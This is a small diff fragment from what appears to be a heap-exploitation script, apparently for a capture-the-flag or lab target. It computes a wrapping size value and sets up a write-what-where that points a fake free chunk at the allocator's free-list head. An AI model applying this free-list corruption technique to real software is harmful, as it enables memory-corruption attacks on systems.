@@ -27,6 +27,8 @@ desired_end = start + 4 # to make size 4
 magic_end = (desired_end - end1) % 2**32
 assert (end1 + magic_end) % 2**32 == desired_end
 
+malloc_free_list_head = heapctx + 0x3C
+
 what = fake_free_chunk
 where = malloc_free_list_head
 
